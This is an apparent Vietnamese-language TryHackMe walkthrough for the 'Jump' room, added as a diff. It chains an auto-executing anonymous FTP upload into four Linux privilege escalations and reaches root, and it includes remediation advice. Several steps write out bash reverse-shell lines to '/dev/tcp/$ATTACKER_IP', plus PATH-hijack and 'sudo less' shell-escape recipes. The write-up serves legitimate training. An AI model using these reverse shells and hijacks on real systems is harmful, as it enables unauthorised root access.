@@ -1,0 +1,223 @@
+---
+title: 'Jump'
+description: 'Một thư mục FTP ẩn danh ghi được, tự động thực thi file tải lên cho shell đầu tiên, rồi một chuỗi leo thang qua bốn user: một script backup ghi được, một systemd service có thư mục PATH ghi được, một helper chạy qua sudo sửa được, và cuối cùng là sudo less dẫn đến root.'
+date: 2026-05-31
+platform: tryhackme
+room: 'Jump'
+roomUrl: 'https://tryhackme.com/room/jump'
+difficulty: easy
+tags:
+  - 'ftp'
+  - 'linux'
+  - 'privesc'
+  - 'path-injection'
+  - 'sudo'
+vulnClasses:
+  - 'anonymous ftp write access'
+  - 'executable path hijacking'
+  - 'insecure privileged service'
+  - 'insecure sudo configuration'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Jump — Một FTP Drop Tự Thực Thi Và Chuỗi Leo Thang Đặc Quyền Bốn Chặng**
+
+_Bài walkthrough thử thách "Jump" trên TryHackMe. Một FTP server ẩn danh có thư mục "incoming" ghi được mà file tải lên bị chạy tự động — nên shell đầu tiên là miễn phí. Từ đó box là một cái thang leo thang đặc quyền Linux kinh điển: một script backup ghi được, một systemd service tìm lệnh trong một PATH ghi được, một helper chạy qua sudo mà ta sửa được, và cuối cùng là_ _`sudo less`_ _dẫn đến root. Năm user, năm lỗi phân quyền._
+
+> Toàn bộ flag đã redact. Jump là phòng huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên mục tiêu luyện tập hợp pháp. Flag hiển thị dạng `THM{<redacted>}`; giá trị thật được khôi phục trên máy nhưng được giấu ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+FTP ẩn danh có `incoming/` ai cũng ghi được mà file tải lên bị **tự động thực thi** → thả một script reverse shell để có shell quyền `recon_user` → `/opt/dev/backup.sh` được `dev_user` chạy và ta **ghi được**, thêm một dòng callback → shell quyền `dev_user` → một systemd service (`healthcheck.service`, chạy quyền `monitor_user`) dùng `Environment=PATH=/opt/dev/bin:...` và gọi `ps` không có đường dẫn tuyệt đối, còn `/opt/dev/bin` **`dev_user`** **ghi được** → trồng một `ps` độc, chờ timer → shell quyền `monitor_user` → `sudo -l` cho thấy `monitor_user` chạy được `/usr/local/bin/deploy.sh` với quyền `ops_user`, và script đó gọi một `/opt/app/deploy_helper.sh` **ghi được** → shell quyền `ops_user` → `ops_user` chạy được `/usr/bin/less` với quyền **root** NOPASSWD → `!bash` từ trong pager → **root**.
+
+Năm user, mỗi cái mở khóa bởi một file hay một luật mà user trước đó lẽ ra không bao giờ đợc chạm vào.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Quét toàn bộ cổng chỉ thấy FTP và SSH — và banner FTP đã lộ ra chỗ đặt chân:
+
+```text
+21/tcp open  ftp  vsftpd 3.0.5
+|  ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|  drwxrwxrwx  incoming [NSE: writeable]
+22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu
+```
+
+Đăng nhập ẩn danh được phép và `incoming/` ai cũng ghi được. `pub/README.txt` giải thích tại sao điều đó quan trọng:
+
+```text
+[ recon pipeline ]
+All recon jobs must be placed in incoming/.
+Files are processed automatically on arrival.
+Invalid formats are ignored.
+```
+
+<Callout type="insight">
+
+"File được xử lý tự động" cộng với một thư mục tải lên ai cũng ghi được chính là toàn bộ chỗ đặt chân: bất cứ thứ gì ta thả vào `incoming/` đều bị box thực thi. Phần còn lại của Jump sau đó lặp lại một chủ đề ở mọi mắt xích — **một tiến trình đặc quyền cao hơn tin một file hoặc thư mục mà một user thấp hơn ghi được.**
+
+</Callout>
+
+### **Bước 1 — FTP drop dẫn đến shell quyền** **`recon_user`**
+
+Viết một script reverse shell nhỏ và tải nó lên `incoming/`:
+
+```text
+cat shell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1
+
+ftp -A $IP      # anonymous
+ftp> cd incoming
+ftp> put shell.sh
+```
+
+Pipeline chạy nó và listener của ta bắt được shell:
+
+```text
+nc -lvnp 4444
+# connect from $IP ...
+recon_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Bước 2 — script backup ghi được, shell quyền** **`dev_user`**
+
+Tìm các thư mục ghi được, `/opt/dev` nổi bật, và `/opt/dev/backup.sh` là một script `dev_user` chạy. Ta chỉ cần thêm callback của mình vào:
+
+```text
+find / -type d -writable 2>/dev/null        # -> /opt/dev among others
+echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4445 0>&1' >> /opt/dev/backup.sh
+```
+
+Lần chạy tiếp theo của script đưa ta thành `dev_user`:
+
+```text
+dev_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Bước 3 — hijack PATH của systemd, shell quyền** **`monitor_user`**
+
+`dev_user` đọc được service điều khiển "health check" của box:
+
+```text
+cat /etc/systemd/system/healthcheck.service
+# [Service]
+# User=monitor_user
+# Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
+# ExecStart=/usr/local/bin/healthcheck
+
+cat /usr/local/bin/healthcheck
+# #!/bin/bash
+# ... ps aux | grep -v grep ...      # calls ps / grep with NO absolute path
+```
+
+Service chạy quyền `monitor_user`, tìm lệnh trong `/opt/dev/bin` **trước tiên**, và `/opt/dev/bin` `dev_user` ghi được. Một `healthcheck.timer` đi kèm kích hoạt nó mỗi 60 giây. Ta trồng một `ps` độc:
+
+```text
+cd /opt/dev/bin
+rm ps
+printf '#!/bin/bash\nbash -i >& /dev/tcp/$ATTACKER_IP/4446 0>&1\n' > ps
+chmod +x ps
+```
+
+Khi timer kích hoạt service lần tiếp theo, `monitor_user` chạy `ps` của ta:
+
+```text
+monitor_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Bước 4 — helper chạy qua sudo ghi được, shell quyền** **`ops_user`**
+
+`monitor_user` có một luật sudo:
+
+```text
+sudo -l
+# (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
+
+cat /usr/local/bin/deploy.sh
+# #!/bin/bash
+# cd /opt/app 2>/dev/null
+# ./deploy_helper.sh          # <- calls a helper we can write
+```
+
+`/opt/app/deploy_helper.sh` `monitor_user` ghi được, nên ta thêm một callback và chạy lệnh được phép với quyền `ops_user`:
+
+```text
+echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4448 0>&1' >> /opt/app/deploy_helper.sh
+sudo -u ops_user /usr/local/bin/deploy.sh
+```
+
+```text
+ops_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Bước 5 —** **`sudo less`** **dẫn đến root**
+
+`ops_user` kết thúc bằng một sudo cấu hình sai kiểu GTFOBins kinh điển:
+
+```text
+sudo -l
+# (root) NOPASSWD: /usr/bin/less
+
+sudo /usr/bin/less /etc/passwd
+# then, inside the pager, type:
+!bash
+```
+
+`less` có thể sinh ra một shell bằng `!`, và vì nó chạy quyền root, shell cũng vậy:
+
+```text
+root@tryhackme-2404:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+FTP drop → `recon_user` → `dev_user` → `monitor_user` → `ops_user` → root.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Thực thi mã từ xa không cần xác thực (FTP drop) nối chuỗi thành root hoàn toàn qua bốn lỗi leo thang độc lập:
+
+- **FTP ẩn danh, ghi được, tự thực thi file tải lên** — đặt chân tức thì, không cần credential.
+- **Một script chạy bởi user khác mà ghi được** (`backup.sh`) và **một helper chạy qua sudo mà user thấp hơn sửa được** (`deploy_helper.sh`) — thực thi mã tùy ý với quyền user đó.
+- **Một systemd service có một mục PATH ghi được** và tên lệnh tương đối — thực thi mã với tài khoản service.
+- **`sudo less`** **quyền root** — một pager có thể shell out, tức root trực tiếp.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Đừng tự động thực thi file tải lên không tin cậy.** Tắt quyền ghi FTP ẩn danh, hoặc xử lý upload trong một sandbox không bao giờ chạy chúng; `incoming/` không được ai cũng ghi được.
+2. **Siết chặt các script đặc quyền và thư mục của chúng.** `backup.sh`, `deploy_helper.sh`, và `/opt/dev/bin` phải thuộc sở hữu root và user thấp hơn không ghi được.
+3. **Harden unit systemd.** Dùng đường dẫn tuyệt đối cho mọi lệnh, đặt một `PATH` tin cậy tối thiểu, và không bao giờ đưa một thư mục user ghi được vào đó.
+4. **Sửa các luật sudo.** Đừng cấp `NOPASSWD` cho các trình thông dịch/pager như `less` (GTFOBins), và đừng cho một user chạy một script mà callee của nó họ sửa được.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **"Xử lý tự động" nghĩa là "được thực thi."** Một thư mục drop ghi được mà chạy nội dung của nó là thực thi mã từ xa không cần login.
+- **Lỗi lặp lại là ghi-nơi-không-nên.** Mọi chặng ở đây là một user cao hơn tin một file hay thư mục mà user thấp hơn sửa được — hãy audit quyền sở hữu và phân quyền trên bất cứ thứ gì mà code đặc quyền chạm vào.
+- **Tên lệnh tương đối + một PATH ghi được = hijack.** Unit systemd phải gọi binary bằng đường dẫn tuyệt đối và giữ thư mục user ghi được ra khỏi `PATH`.
+- **Luôn kiểm tra** **`sudo -l`** **trước tiên, mỗi lần.** `less` (và đa số pager/editor) có thể sinh shell; một mục NOPASSWD là cả bước cuối.
+
+Cảm ơn bạn đã đọc. Jump là một chuyến tham quan gọn gàng về privesc Linux thường ngày — không exploit, chỉ là phân quyền và niềm tin đặt hơi lỏng một nấc ở mọi cấp độ.
